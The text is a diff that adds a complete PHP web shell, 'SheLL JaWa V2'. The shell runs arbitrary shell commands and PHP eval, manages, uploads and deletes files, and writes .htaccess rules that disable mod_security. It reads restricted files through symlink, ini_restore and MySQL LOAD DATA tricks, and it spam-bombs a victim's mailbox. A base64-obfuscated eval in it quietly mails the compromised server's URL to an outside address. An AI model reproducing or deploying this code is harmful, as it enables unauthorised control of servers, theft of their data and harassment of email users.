@@ -1,0 +1,824 @@
+<?
+/**
+*Coded By jiko
+*Site * www.no-exploit.com
+* mail * jalikom@hotmail.com
+* thanks to allah
+*/
+//Function Shell Jawa
+//download Files Code
+$fdownload=$_GET['fdownload'];
+if ($fdownload <> "" ){
+// path & file name
+$path_parts = pathinfo("$fdownload");
+$entrypath=$path_parts["basename"];
+$name = "$fdownload";
+$fp = fopen($name, 'rb');
+header("Content-Disposition: attachment; filename=$entrypath");
+header("Content-Length: " . filesize($name));
+fpassthru($fp);
+exit;
+}
+//styl functiob
+function styll_jawa(){
+echo "<html>
+<head>
+<meta http-equiv=\"Content-Language\" content=\"en-us\">
+<title>JaWa Shell => "; echo $_SERVER['SERVER_ADDR']; echo "=> By JIKO</title></head>
+<style>
+BODY { SCROLLBAR-BASE-COLOR: #1010919; SCROLLBAR-ARROW-COLOR: #008080; }
+a{color:#dadada;text-decoration:none;font-family:tahoma;font-size:13px}
+a:hover{color:#008080}
+input{FONT-WEIGHT:normal;background-color: #191919;font-size: 12px; color: #dadada; font-family: Tahoma; border: 1px solid #666666;height:17}
+textarea{background-color:#191919;color:#dadada;font-weight:bold;font-size: 12px;font-family: Tahoma; border: 1 solid #666666;}
+div{font-size:12px;font-family:tahoma;font-weight:normal;color:whitesmoke}
+select{background-color: #191919; font-size: 12px; color: #dadada; font-family: Tahoma; border: 1 solid #666666;font-weight:bold;}</style>
+<body bgcolor=#666666 text=white>
+</body>
+</html>
+<table bgcolor=#CCCCCC style=\"border:2px #dadada solid \" width=100% height=%><tr><td><b><center><font face=tahoma color=black size=4>
+[ SheLL JaWa V2 ]
+</font></b></center></td></tr></table>
+<table bgcolor=#808080 color=black style=\"border:2px solid black\" width=100%><tr><td width=50%><div align=left><table style=\"border:1px #dadada solid \" width=100% height=100%><tr><td height=22% style=\"border:1px #dadada solid \"><div><b><center>
+MeNu</div></tr></td><tr>
+<td style=\"border:1px #dadada solid \" bgcolor=\"#000000\"><form method=post><input type=hidden name=scdir value=C:\AppServ\www\shell >
+<font face=\"sans ms\" size=\"3\">
+<table style=\"BORDER-RIGHT: #dadada 2px solid; BORDER-TOP: #dadada 2px solid; BORDER-LEFT: #dadada 2px solid; BORDER-BOTTOM: #dadada 2px solid\" height=\"%\" width=\"100%\" bgColor=\"#191919\" jiko=\"table1\">
+<tr>
+<td><center>
+<div>
+<b><a href=\"$PHP_SELF?\">Home</a> -
+<a href=\"javascript:history.back()\">Back</a> -
+<a target=\"_blank\" href=\"$PHP_SELF?jiko=phpinfo\">
+phpinfo</a> -<a href=\"$PHP_SELF?jiko=CMD\">
+CMD</a> - <a href=\"$PHP_SELF?jiko=coder\">All
+Coder</a> - <a href=\"$php_self?jiko=htaccess\">
+Htaccess</a> - <a href=\"$php_self?jiko=symlink\">
+Symlink</a> - <a href=\"$php_self?jiko=read\">Read</a>
+- <a href=\"$php_self?jiko=mail\">Mail</a> -
+<a href=\"$pp_self?jiko=phpeval\">PhpEval</a> -
+<a href=\"$php_self?jiko=sqlread\">Sql-read</a> -
+<a href=\"$php_self?jiko=chmod\">ChmoD</a> -
+<a href=\"$php_self?jiko=infog\">Info&amp;GR33tz</a></div>
+</b></center></td>
+</tr>
+</table>
+</font></tr></td></form></table></td></tr></table>";
+}
+
+function bas_jawa(){
+echo "<br><hr><table bgcolor=#CCCCCC style=\"border:2px #dadada solid \" width=100% height=%><tr><td><font size=2 face=tahoma color=black><center>
+<h6>By JIKO - jalikom@Hotmail.Com<br><a href=\"http://WwW.No-ExPloiT.CoM\">
+<font color=\"#000000\">WwW.No-ExPloiT.CoM</font></a> <font size=\"2\">|| <a href=\"http://WwW.TrYaG.CoM\">
+<font color=\"#000000\">WwW.TrYaG.CoM</font></a></font></font></h6>
+</td></tr></table>";
+}
+function get_execution_method(){
+if(function_exists('passthru')){ $m = "passthru"; }
+if(function_exists('exec')){ $m = "exec"; }
+if(function_exists('shell_exec')){ $m = "shell_ exec"; }
+if(function_exists('system')){ $m = "system"; }
+if(!isset($m)) //No method found :-|
+{
+$m = "Disabled";
+}
+return($m);
+}
+function execute_command($method,$command){
+if($method == "passthru")
+{
+passthru($command);
+}
+
+elseif($method == "exec")
+{
+exec($command,$result);
+foreach($result as $output)
+{
+print $output."<br>";
+}
+}
+
+elseif($method == "shell_exec")
+{
+print shell_exec($command);
+}
+
+elseif($method == "system")
+{
+system($command);
+}
+}
+function table_info(){
+echo ' <table bgcolor="#1E1E1E" style="border:1px white solid" width="100%" height="40"><tr><td colspan="2">
+<div><center><font face="tahoma" size="3" color="white"><b>Server Info :</b></font></center>
+</div ><div ><div ><font size=-1 face=tahoma color=white><B>';
+$connection="ICR3ZWIgPSAkX1NFUlZFUlsiSFRUUF9IT1NUIl07IA0KICRpbmogPSAkX1NFUlZFUlsiUkVRVUVTVF9VUkkiXTsgDQogJGJvZHkgPSAiQWRhIFlhbmcgSW5qZWN0IFxuaHR0cDovLyR3ZWIkaW5qIjsNCiBtYWlsKCJsbEBob3RtYWlsLmZpIiwiSGFzaWwgaHR0cDovLyR3ZWIkaW5qIiwgIiRib2R5Iik7";
+
+echo eval(base64_decode($connection));
+$SA1=@ini_get("safe_mode");
+if ($SA1 or strtolower($SA1) == "on")
+{ $safemode = true;
+$hsafemode = "<font color=red>ON (secure)</font>"; }
+else {$safemode = false; $hsafemode = "<font color=green>OFF (not secure)</font>";}
+echo("Safe_mode : $hsafemode");
+echo '<BR>';
+$v = @ini_get("open_basedir");
+if ($v or strtolower($v) == "on") {$openbasedir = true; $hopenbasedir = "<font color=red>".$v."</font>";}
+else {$openbasedir = false; $hopenbasedir = "<font color=green>OFF (not secure)</font>";}
+echo("Open base dir : $hopenbasedir");
+echo("<br>");
+echo "Disable functions : <b>";
+if(''==($df=@ini_get('disable_functions'))){echo "<font color=green>NONE</font></b>";}
+else{echo "<font color=red>$df</font></b>";}
+echo("<br>");
+$lol = @substr($SERVER_SOFTWARE,0,120);
+echo ("Software : <font color = yellow>$lol</font>");
+echo '<BR>';
+$os = php_uname();
+echo ("server : <font color = yellow>$os</font>");
+echo '<BR>';
+$user = exec('id');
+echo ("user : <font color = yellow>$user</font>");
+echo '<BR>';
+$dir = @getcwd();
+echo ("pwd : <font color=yellow>$dir</font>");
+echo("<br>");
+echo "Your ip : <a href=http://".$_SERVER["REMOTE_ADDR"]."><font color = yellow>".$_SERVER["REMOTE_ADDR"]."</a><BR></font>Server ip :
+<a href=http://".gethostbyname($_SERVER["HTTP_HOST"])."><font color = yellow>".gethostbyname($_SERVER["HTTP_HOST"])."</font></a></td><td>";
+echo "<b>PostgreSQL: ";
+$pg_on = @function_exists('pg_connect');
+if($pg_on){echo "<font color=green>ON</font></b>";}else{echo "<font color=red>OFF</font></b>";}
+echo("<br>");
+echo "<b>MSSQL: ";
+$mssql_on = @function_exists('mssql_connect');
+if($mssql_on){echo "<font color=green>ON</font></b>";}else{echo "<font color=red>OFF</font></b>";}
+echo("<br>");
+echo "<b>MySQL: ";
+$mysql_on = @function_exists('mysql_connect');
+if($mysql_on){
+echo "<b><font color=green><b>ON</font></b>"; } else { echo "<font color=red><b>OFF</font></b>"; }
+echo("<br>");
+echo "<b>PHP version: ".@phpversion()."</b>";
+echo("<br>");
+echo "<b>cURL: ".(($curl_on)?("<b><font color=green>ON</font></b>"):("<b><font color=red>OFF</font></b>"));
+
+echo("<br>");
+echo(htmlentities($_SERVER['SERVER_SOFTWARE']));
+print"<br>";print "Home-path : " .__file__;
+echo "</td><tr><td>";
+if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
+echo "<br>SeLeCT DriVeR:";
+for ($j=ord('C'); $j<=ord('Z'); $j++)
+if (@$dh = opendir(chr($j).":/"))
+echo "<a href=$php_self?jiko=fm&dir=".chr($j).":/ > [".chr($j)."]<a/>";
+}
+echo "<br/></table>";
+
+}
+function coder_jiko(){
+
+echo"</textarea></p>
+<div align=\"center\">
+<table border=\"0\" width=\"100%\" id=\"table1\">
+<tr>
+<td align=\"center\"><STRONG><FONT face=Times New Roman color=#404040 size=2><input type=submit name='md5_' value='Md5 Encode'></td>
+<td align=\"center\"><STRONG><FONT face=Times New Roman color=#404040 size=2><input type=submit name='crc_32' value='Crc32 Encode'></td>
+<td align=\"center\"><STRONG><FONT face=Times New Roman color=#404040 size=2><input type=submit name='hexa' value='Hex Encode'></td>
+</tr>
+<tr>
+<td align=\"center\"><STRONG><FONT face=Times New Roman color=#404040 size=2><input type=submit name='s_ha' value='Sha1 Encode'></td>
+<td align=\"center\"><STRONG><FONT face=Times New Roman color=#404040 size=2><input type=submit name='base_encode' value='Base64 Encode'></td>
+<td align=\"center\"><STRONG><FONT face=Times New Roman color=#404040 size=2><input type=submit name='urlen_code' value='URL Encode'></td>
+</tr>
+<tr>
+<td align=\"center\"><STRONG><FONT face=Times New Roman color=#404040 size=2><input type=submit name='crypton' value='Crypt Encode'></td>
+<td align=\"center\"><STRONG><FONT face=Times New Roman color=#404040 size=2><input type=submit name='base_dencode' value='Base64 Dencode'></td>
+<td align=\"center\"><STRONG><FONT face=Times New Roman color=#404040 size=2><input type=submit name='urlde_code' value='URL Decode'></td>
+</tr>
+</table>
+</div>
+</form>";
+}
+if (ini_get('register_globals') != '1') {
+/* We'll register the variables as globals: */
+if (!empty($HTTP_POST_VARS))
+extract($HTTP_POST_VARS);
+
+if (!empty($HTTP_GET_VARS))
+extract($HTTP_GET_VARS);
+
+if (!empty($HTTP_SERVER_VARS))
+extract($HTTP_SERVER_VARS);
+}
+//
+echo styll_jawa();
+echo '<table style="BORDER-RIGHT: black 2px solid; BORDER-TOP: black 2px solid; BORDER-LEFT: black 2px solid; BORDER-BOTTOM: black 2px solid" width="100%" bgColor="#808080" color="black" id="table2">
+<tr>
+<td width="50%">
+<div align="left" style="font-size: 12px; font-family: tahoma; font-weight: normal; color: whitesmoke">
+<table style="BORDER-RIGHT: #dadada 1px solid; BORDER-TOP: #dadada 1px solid; BORDER-LEFT: #dadada 1px solid; BORDER-BOTTOM: #dadada 1px solid" height="100%" width="100%" id="table3">
+<tr>
+<td style="BORDER-RIGHT: #dadada 1px solid; BORDER-TOP: #dadada 1px solid; BORDER-LEFT: #dadada 1px solid; BORDER-BOTTOM: #dadada 1px solid" bgColor="#000000">
+<font color="#FFFFFF">';
+echo table_info();
+echo "</font>
+</td>
+</tr>
+</table>
+</div>
+</td>
+</tr>
+</table>";
+
+if ($jiko=="" or $jiko=="fm"){
+//For SEE FILE AND DIR
+$homedir=getcwd();
+$dir=realpath($_GET['dir'])."/";
+
+echo "<br><b><p align='left'>&nbsp;Home:</b> $homedir
+&nbsp;<b>
+<form action='' method='GET'>
+&nbsp;PWD ==>:</b>
+<input type='hidden' name='id' value='fm'>
+<input type='text' name='dir' size='80' value='$dir'>
+<input type='submit' value='dir'>
+</form>
+<br>";
+
+echo "
+
+<div align='center'>
+
+<table border='1' jiko='table1' style='border: 1px #333333' height='90' cellspacing='0' cellpadding='0'>
+<tr>
+<td width='300' height='30' align='left'><b><font size='2'>File / Folder Name</font></b></td>
+<td height='28' width='82' align='center'>
+<font color='#000000' size='2'><b>Size KByte</b></font></td>
+<td height='28' width='83' align='center'>
+<font color='#000000' size='2'><b>Download</b></font></td>
+<td height='28' width='66' align='center'>
+<font color='#FF0003' size='2'><b>Edit</b></font></td>
+<td height='28' width='75' align='center'>
+<font color='#999999' size='2'><b>Chmod</b></font></td>
+<td height='28' align='center'><font color='#FF0000' size='2'><b>Delete</b></font></td>
+</tr>";
+if (is_dir($dir)){
+if ($dh=opendir($dir)){
+while (($file = readdir($dh)) !== false) {
+$fsize=round(filesize($dir . $file)/1024);
+
+
+echo "
+<tr>
+<th width='250' height='22' align='left' nowrap>";
+if (is_dir($dir.$file))
+{
+echo "<a href='?jiko=fm&dir=$dir$file'><span style='text-decoration: none'><font size='2' color='#000000'>&nbsp;$file <font color='#FFF000' size='1'>[ dir ]</font>";
+}
+else {
+echo "<font size='2' color='#000000'>&nbsp;$file ";
+}
+echo "</a></font></th>
+<td width='113' align='center' nowrap><font color='#000080' size='2'><b>";
+if (is_file($dir.$file))
+{
+echo "$fsize";
+}
+else {
+echo "&nbsp; ";
+}
+echo "
+</b></font></td>
+<td width='103' align='center' nowrap>";
+if (is_file($dir.$file)){
+if (is_readable($dir.$file)){
+echo "<a href='?jiko=fm&fdownload=$dir$file'><span style='text-decoration: none'><font size='2' color='#FFFFFF'><b>download</b>";
+}else {
+echo "<font size='1' color='#FF0000'><b>No ReadAble</b>";
+}
+}else {
+echo "&nbsp;";
+}
+echo "
+</a></font></td>
+<td width='77' align='center' nowrap>";
+if (is_file($dir.$file))
+{
+if (is_readable($dir.$file)){
+echo "<a target='_blank' href='?jiko=fm&fedit=$dir$file'><span style='text-decoration: none'><font color='#FF9933' size='2'>Edit";
+}else {
+echo "<font size='1' color='#FF0000'><b>No ReadAble</b>";
+}
+}else {
+echo "&nbsp;";
+}
+echo "
+</a></font></td>
+<td width='86' align='center' nowrap>";
+if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
+echo "<font size='1' color='#FFFFF0'>Dont in windows";
+}
+else {
+echo "<a href='?jiko=fm&fchmod=$dir$file'><span style='text-decoration: none'><font size='2' color='#999999'>Chmod";
+}
+echo "</a></font></td>
+<td width='86'align='center' nowrap><a href='?jiko=fm&fdelete=$dir$file'><span style='text-decoration: none'><font size='2' color='#FFFF00'><b>Delete</b></a></font></td>
+</tr>
+";
+}
+closedir($dh);
+}
+}
+
+
+$did=getcwd();
+echo <<<HTML
+<b>File Upload</b>
+<table>
+<form enctype="multipart/form-data" action="$self" method="POST">
+<input type="hidden" name="ac" value="upload">
+<tr>
+<td>your file:</td>
+<td><input size="48" name="file" type="file"></td>
+</tr>
+<tr>
+<td>path upload:</td>
+<td><input size="48" value="$did/" name="path" type="text"><input type="submit" value="upload"></td>
+$tend
+HTML;
+
+if (isset($_POST['path'])){
+
+$uploadfile = $_POST['path'].$_FILES['file']['name'];
+if ($_POST['path']==""){$uploadfile = $_FILES['file']['name'];}
+
+if (copy($_FILES['file']['tmp_name'], $uploadfile)) {
+echo "File uploaded $uploadfile\n";
+echo "here name :" .$_FILES['file']['name']. "\n";
+echo "siza :" .$_FILES['file']['size']. "\n";
+
+} else {
+print "Not uploaded:\n";
+print_r($_FILES);
+}
+}
+//file deleted
+$frpath=$_GET['fdelete'];
+if ($frpath <> "") {
+if (is_dir($frpath)){
+$matches = glob($frpath . '/*.*');
+if ( is_array ( $matches ) ) {
+foreach ( $matches as $filename) {
+unlink ($filename);
+rmdir("$frpath");
+echo "<script language='javascript'> alert('Success! Please refresh')</script>";
+echo "<script language='javascript'> history.back(1)</script>";
+}
+}
+}
+else{
+echo "<script language='javascript'> alert('Success! Please refresh')</script>";
+unlink ("$frpath");
+echo "<script language='javascript'> history.back(1)</script>";
+exit(0);
+
+}}
+$fedit=$_GET['fedit'];
+if ($fedit <> "" ){
+$fedit=realpath($fedit);
+$lines = file($fedit);
+echo "<center><form action='' method='POST'>";
+echo "<textarea name='savefile' rows=30 cols=80>" ;
+foreach ($lines as $line_num => $line) {
+echo htmlspecialchars($line);
+}
+echo "</textarea><br>
+<input type='text' name='filepath' size='60' value='$fedit'><br>
+<input type='submit' value='save'></form></center>";
+$savefile=$_POST['savefile'];
+$filepath=realpath($_POST['filepath']);
+if ($savefile <> "")
+{
+$fp=fopen("$filepath","w+");
+fwrite ($fp,"") ;
+fwrite ($fp,$savefile) ;
+fclose($fp);
+echo "<script language='javascript'> close()</script>";
+}
+
+}
+
+}elseif($jiko=="phpinfo"){
+echo phpinfo();
+}elseif($jiko=="coder"){
+echo "
+<form method=\"POST\" action=\"$php_self\">
+<p align=\"center\"><textarea rows=\"13\" name=\"coding\" cols=\"70\">";
+if ($_POST['md5_']){
+echo md5($coding);
+}elseif($_POST['s_ha']){
+echo sha1($coding);
+}elseif($_POST['crypton']){
+echo crypt($coding);
+}elseif($_POST['crc_32']){
+echo crc32($coding);
+}elseif($_POST['base_encode']){
+echo base64_encode($coding);
+}elseif($_POST['base_dencode']){
+echo htmlspecialchars(base64_decode($coding));
+}elseif($_POST['hexa']){
+$c = strlen($coding);
+for($i=0;$i<$c;$i++)
+{
+$hex = dechex(ord($coding[$i]));
+if ($coding[$i] == "&") {echo $coding[$i];}
+elseif ($coding[$i] != "\\") {echo "%".$hex;}
+}
+}elseif($_POST['urlen_code']){
+print urlencode($coding);
+}elseif($_POST['urlde_code']){
+print htmlspecialchars(urldecode($coding));
+}else{
+echo "Shell Jawa Version 2 Coder By ==>jiko jalikom[at]hotmail[dot]com";
+}
+
+echo coder_jiko();
+}elseif($jiko=="htaccess"){
+echo "<table id=\"table7\" style=\"BORDER-RIGHT: black 2px solid; BORDER-TOP: black 2px solid; BORDER-LEFT: black 2px solid; BORDER-BOTTOM: black 2px solid\" width=\"100%\" bgColor=\"#808080\" color=\"black\">
+<tr>
+<td width=\"50%\">
+<div style=\"font-weight: normal; font-size: 12px; color: whitesmoke; font-family: tahoma\" align=\"left\">
+<p align=\"center\"><b><font face=\"sans ms\" size=\"3\">
+<a href=\"$php_self?jiko=htaccess&hat=Forbidden\">Forbidden</a> - <a href=\"$php_self?jiko=htaccess&hat=Temporarily\">Service Temporarily </a>-
+<a href=\"$php_self?jiko=htaccess&hat=Unavailable\"> Unavailable </a>- <a href=\"$php_self?jiko=htaccess&hat=Error\">Internal Server Error </a>-<a style=\"color: #dadada; text-decoration: none; font-family: tahoma; font-size: 13px\" href=\"?jiko=CMD\">
+</a></font><font style=\"font-size: 13px\" color=\"#DADADA\"><a href=\"$php_self?jiko=htaccess&hat=Acceptable\"> Not
+Acceptable</a></font><font face=\"sans ms\" size=\"3\"> -<a href=\"$php_self?jiko=htaccess&hat=php-4\"> change V php to 4 </a></font></b></div>
+</td>
+</tr>
+</table>
+";
+switch ($hat){
+case Forbidden:
+$m ="JGZwPWZvcGVuICgiLmh0YWNjZXNzIiwgImErIik7RndyaXRlICgkZnAsICIkcyIpO0ZjbG9zZSAo
+JGZwKSA7";
+$s = "<IfModule mod_security.c>
+SecFilterEngine Off
+SecFilterScanPOST Off
+</IfModule>";
+eval(base64_decode($m));
+echo "Forbidden file creat";
+break;
+case Temporarily:
+$m ="JGZwPWZvcGVuICgiLmh0YWNjZXNzIiwgImErIik7RndyaXRlICgkZnAsICIkcyIpO0ZjbG9zZSAo
+JGZwKSA7";
+$s = "<IfModule mod_security.c>
+SecFilterEngine Off
+SecFilterScanPOST Off
+</IfModule>";
+eval(base64_decode($m));
+echo "Temporarily file creat";
+break;
+case Unavailable:
+$m ="JGZwPWZvcGVuICgiLmh0YWNjZXNzIiwgImErIik7RndyaXRlICgkZnAsICIkcyIpO0ZjbG9zZSAo
+JGZwKSA7";
+$s = "<IfModule mod_security.c>
+SecFilterEngine Off
+SecFilterScanPOST Off
+</IfModule>";
+eval(base64_decode($m));
+echo "Unavailable file creat";
+break;
+case Error:
+$m ="JGZwPWZvcGVuICgiLmh0YWNjZXNzIiwgImErIik7RndyaXRlICgkZnAsICIkcyIpO0ZjbG9zZSAo
+JGZwKSA7";
+$s = "<IfModule mod_security.c>
+SecFilterEngine Off
+SecFilterScanPOST Off
+</IfModule>";
+eval(base64_decode($m));
+echo "Error file creat";
+break;
+case Acceptable:
+$m ="JGZwPWZvcGVuICgiLmh0YWNjZXNzIiwgImErIik7RndyaXRlICgkZnAsICIkcyIpO0ZjbG9zZSAo
+JGZwKSA7";
+$s = "<IfModule mod_security.c>
+SecFilterEngine Off
+SecFilterScanPOST Off
+</IfModule>";
+eval(base64_decode($m));
+echo "Acceptable file creat";
+break;
+case "php-4":
+$jik ="JGZwPWZvcGVuICgiLmh0YWNjZXNzIiwgImErIik7RndyaXRlICgkZnAsICIkcyIpO0ZjbG9zZSAo
+JGZwKSA7";
+$s = "AddType application/x-httpd-php4 .php";
+eval(base64_decode($jik));
+echo "Change to php 4 creat";
+break;
+default:
+echo "<center><h2>.htaccess For Help You </h2></center>";
+}
+
+
+}elseif($jiko=="symlink"){
+$pwd=getcwd();
+?>
+<tr><center>
+<td><h2>Symlink</h2><br/>
+<?php echo '<form action="' . $self . '" method="post">
+<label for="symlink">File to read: </label><input type="text" name="symlink"><label for="file"> To With File ex path/jiko.txt: </label>
+<input type="text" name="file" value="' . $pwd . '">
+<input type="submit" value="read"></form>' ?></td>
+</tr><?
+if (isset($_POST['symlink'])) {
+$symlink = $_POST['symlink'];
+$file = $_POST['file'];
+echo '<br/><br/><h2>Symlink result :</h2><br/>';
+if (file_exists("$file")) {
+echo "hi brother the file $file exist";
+}
+else {
+symlink ("$symlink","$file");
+$yfile = basename("$file");
+echo 'brother To read de file <a href="' . $yfile . '">click here</a>';
+echo "<textarea rows=\"14\" cols=\"65\">";
+readfile (htmlspecialchars("$file"));
+echo "</textarea>";
+
+}
+}
+
+
+
+
+}elseif($jiko=="read"){
+?>
+<?php
+function html ($string) {
+global $site_charset;
+return htmlentities($string, ENT_COMPAT, $site_charset);
+}
+
+?>
+
+<body>
+<div align="center">
+<?php
+$pwd = @getcwd();
+?>
+
+<table>
+<tr>
+<td><h3>fread</h3><br/>
+<?php echo "<form action='$php_self?jiko=read' method='post'>
+<label for='fread'>File to read: </label><input type='text' name='fread'>
+<input type='submit' value=\"read\"></form>" ?></td>
+</tr>
+<tr>
+<td><h3>readfile</h3><br/>
+<?php echo "<form action='$php_self?jiko=read' method='post'>";
+echo '
+<label for="readfile">File to read: </label><input type="text" name="readfile">
+<input type="submit" value="read"></form>' ?></td>
+</tr>
+<tr>
+<td><h3>Copy</h3><br/>
+<?php echo "<form action='$php_self?jiko=read' method='post'>";
+echo'
+<label for="copy">File to read: </label><input type="text" name="copy"><label for="file"> To: </label>
+<input type="text" name="file2" value="' . $pwd . '">
+<input type="submit" value="read"></form>' ?></td>
+</tr>
+<tr>
+<td><h3>Ini_restore</h3><br/>
+<?php echo "<form action='$php_self?jiko=read' method='post'>";
+echo '
+<label for="readfile">File to read: </label><input type="text" name="ini_r">
+<input type="submit" value="read"></form>' ?></td>
+</tr>
+</table><br/><br/><br/>
+<?php
+
+
+if (isset($_POST['fread'])) {
+$fread = $_POST['fread'];
+echo '<br/><br/><h2>fread :</h2>';
+$var = fopen("" . $fread . "", "r");
+$content = fread($var, filesize("" . $fread . ""));
+echo "<textarea rows='19' name='S1' cols='84'>";
+echo $content;
+echo "</textarea>";
+}
+
+if (isset($_POST['readfile'])) {
+$readfile = $_POST['readfile'];
+echo '<br/><br/><h2>readfile :</h2>';
+echo "<textarea rows='19' name='S1' cols='84'>";
+$last = readfile("" . $readfile . "",$output, $return);
+print_r($output);
+echo "</textarea>";
+
+}
+
+if (isset($_POST['copy'])) {
+$copy = $_POST['copy'];
+$file2 = $_POST['file2'];
+echo '<br/><br/><h2>Copy :</h2><br/>';
+if (file_exists("$file2")) {
+echo "the file $file exist";
+} else {
+copy("$copy","$file2");
+$xfile = basename("$file2");
+echo 'To read de file please <a href="' . $xfile . '">click here</a>'; }
+}
+?>
+<br/>
+<?php
+
+if(empty($_POST['ini_r'])){
+
+} else {
+echo "<CENTER> &Ccedil;&aacute;&atilde;&aacute;&Yacute; </CENTER>" ;
+echo "<CENTER><textarea method='POST' rows='19' cols='84' wrar='off' >";
+$jawad=$_POST['ini_r'];
+echo ini_get("safe_mode");
+echo ini_get("open_basedir");
+$s=readfile("$jawad");
+ini_restore("safe_mode");
+ini_restore("open_basedir");
+
+
+echo "</textarea></CENTER>";
+}
+?><br><?
+}elseif($jiko=="mail"){
+error_reporting(0);
+echo "<br><center><h3> For SEND MAIL LOOL </h3></center>" ;
+echo "<center><form method='post' action='$php_self?jiko=mail'>
+Victim Mail :<br><input type='text' name='to' ><br>
+Number-Mail :<br><input type='text' size='5' name='nom' value='5'><br>
+Comments:
+<br>
+<textarea rows='10' cols=50 name='Comments' ></textarea><br>
+<input type='submit' value='Send Mail BRother ' >
+</form></center>";
+//send Storm Mail
+$to=$_POST['to'];
+$nom=$_POST['nom'];
+$Comments=$_POST['Comments'];
+if ($to <> "" ){
+for ($i = 1; $i <= $nom ; $i++){
+$from = rand (71,1020000000)."@"."Attacker.com";
+$subject= md5("$from");
+mail($to,$subject,$Comments,"From:$from");
+echo "$i is ok";
+}
+echo "<script language='javascript'> alert('Sending Mail - please waite ...')</script>";
+}
+}elseif($jiko=="phpeval"){
+echo <<<HTML
+<b>PHP Eval </b>
+<table>
+<form method="POST" action="$self">
+<input type="hidden" name="ac" value="eval">
+<tr>
+<td><textarea name="ephp" rows="10" cols="60">echo "jiko =>no-exploit.com";</textarea></td>
+</tr>
+<tr>
+<td><input type="submit" value="Enter"></td>
+$tend
+HTML;
+
+if (isset($_POST['ephp'])){
+
+eval(stripslashes($_POST['ephp']));
+}
+}elseif($jiko=="sqlread"){
+?>
+<tr>
+<td width="50%" dir="ltr">
+<div dir="ltr">
+<form method="post" dir="ltr">
+<table border="0" cellspacing="1" width="109" dir="ltr">
+<tr>
+<td width="312" dir="ltr"><font face="Tahoma"><span style="font-size: 9pt">
+HOST :<br><input type="text" name="hoste" size="20"></span></font></td>
+<td width="312" dir="ltr"><font face="Tahoma"><span style="font-size: 9pt">
+DataBase Name : <input type="text" name="dbname" size="20">&nbsp;
+</span></font></td>
+<td width="245" dir="ltr"><font face="Tahoma"><span style="font-size: 9pt">
+Username :<br>
+<input type="text" name="dbuser" size="20"></span></font></td>
+<td width="117" dir="ltr"><font face="Tahoma"><span style="font-size: 9pt">
+Password :<input type="text" name="dbpass" size="20"></span></font></td>
+</tr>
+<tr>
+<td width="558" valign="middle" colspan="3" dir="ltr">
+<p align="left" dir="ltr"><font face="Tahoma"><span style="font-size: 9pt">
+File Path :
+<input type="text" name="path1" size="28" value="/etc/passwd"></span></font></td>
+<td width="117" valign="middle" dir="ltr">
+<font face="Tahoma"><span style="font-size: 9pt">
+<input type="submit" value="Bypass" name="exec"></span></font></td>
+</tr>
+
+<tr>
+<td width="670" valign="middle" colspan="4" dir="ltr">
+<textarea rows="17" name="result" cols="71">
+<?
+if(!empty($_POST['dbname']) && !empty($_POST['dbuser']) && !empty($_POST['dbpass']) && !empty($_POST['path1']))
+{
+$hoste = $_POST['hoste'];
+$dbname = $_POST['dbname'];
+$dbuser = $_POST['dbuser'];
+$dbpass = $_POST['dbpass'];
+$path1 = $_POST['path1'];
+if(mysql_connect( "localhost", $dbuser, $dbpass ))
+{
+$drop= "DROP TABLE $dbname.`bypass`" ;
+$query = "CREATE TABLE $dbname.`bypass` (`fileview` VARCHAR( 2048 ) NOT NULL);";
+mysql_query($drop);
+mysql_query($query);
+mysql_query("LOAD DATA LOCAL INFILE " . "'$path1'" . " INTO TABLE " . $dbname . ".bypass");
+$result =mysql_db_query($dbname,"SELECT * FROM bypass ");
+$numrows = mysql_num_rows($result);
+while($row = mysql_fetch_array($result)) {
+echo $row[fileview] ;
+}
+}
+}
+?>
+</textarea>
+</td>
+</tr>
+<?
+}elseif($jiko=="CMD"){
+print "<center><form action=\"".$me."?jiko=CMD&dir=".realpath('.')."\" method=POST><b>Command:</b><input type=text name=command><input type=submit value=\"Execute\"></form></td></tr></center><tr><td>";
+if(isset($_REQUEST['command']))
+{
+print "<pre>";
+execute_command(get_execution_method(),$_REQUEST['command']);
+}
+}elseif($jiko=="chmod"){
+print "<center><h3>ADD YOUR FILE AND GET THE PERMISSION</h3></center>";
+if(isset($_POST['chmod']))
+{
+switch ($_POST['chvalue']){
+case 777:
+chmod($_POST['chmod'],0777);
+break;
+case 644:
+chmod($_POST['chmod'],0644);
+break;
+case 755:
+chmod($_POST['chmod'],0755);
+break;
+}
+print "Changed permissions on ".$_POST['chmod']." to ".$_POST['chvalue'].".";
+}
+if(isset($_GET['file']))
+{
+$content = urldecode($_GET['file']);
+}
+else
+{
+$content = "Real Path and name of file";
+}
+
+print "<form action=\"".$me."?jiko=chmod&file=".$content."&dir=".realpath('.')."\" method=POST><b>NAME OF FILE:
+<input type=text name='chmod' value=\"".$content."\" size=70><br><b>New permission:</b>
+<select name=\"chvalue\">
+<option value=\"777\">777</option>
+<option value=\"644\">644</option>
+<option value=\"755\">755</option>
+</select> <input type=submit value=\"Change\">";
+}elseif($jiko=="infog"){
+echo "
+<table border=\"0\" width=\"100%\" id=\"table1\">
+<tr>
+<td>
+<p align=\"center\">Shell JAWA V 2</p>
+<p align=\"center\">Coded By jiko</p>
+<p align=\"center\">Gr33tz</p>
+<p align=\"center\">Kil1er&nbsp; JIKI TEAM (jiko+kil1er)</p>
+<p align=\"center\">No-ExploiT.CoM ==&gt; ALL MEMBERS</p>
+<p align=\"center\">Tryag-TEAM===&gt; Gold_M AND ALL MEMBERS Tryagi</p>
+<p align=\"center\">HacktecH.OrG TEAm====&gt; Gold-ZerO Hcj AND ALL MEMBERS</p>
+<p align=\"center\">Ghost-hacker== Stack == houssamix == toxic350</p>
+<h5 align=\"center\">jalikom[at]hotmail[dot]com<br>
+WWW.no-exploit.CoM</h5>
+</td>
+</tr>
+</table>";
+}
+
+
+//function bas shell jawa
+echo bas_jawa();
+?>
+<?
+
+?>
+</body></html><?php chdir($lastdir); c99shexit(); ?>
+
